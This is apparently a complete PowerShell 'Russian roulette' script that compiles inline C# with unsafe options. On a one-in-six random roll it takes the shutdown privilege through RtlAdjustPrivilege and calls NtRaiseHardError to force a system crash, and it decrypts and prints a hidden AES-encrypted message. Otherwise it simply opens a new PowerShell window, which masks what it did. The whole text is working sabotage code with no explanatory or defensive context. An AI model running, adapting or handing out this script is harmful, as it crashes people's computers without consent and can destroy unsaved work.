$s='
using System;
using System.Text;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.IO;
public class X {
    [DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o);
    [DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r);
    public static unsafe string Shot() {
        bool o;
        uint r;
        RtlAdjustPrivilege(19,true,false,out o);
        NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r);
        byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");
        byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");
        byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");
        using(Aes a=Aes.Create()) {
            a.Key=k;
            a.IV=i;
            ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV);
            using(var m=new MemoryStream(c))
            using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))
            using(var s=new StreamReader(y)){
                Console.WriteLine(s.ReadToEnd());
            }
        }
    }
}';
$c=New-Object System.CodeDom.Compiler.CompilerParameters;
$c.CompilerOptions='/unsafe';
$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c;
if((Get-Random -Min 1 -Max 7) -eq 1){
    [X]::Shot()
}
Start-Process "powershell.exe"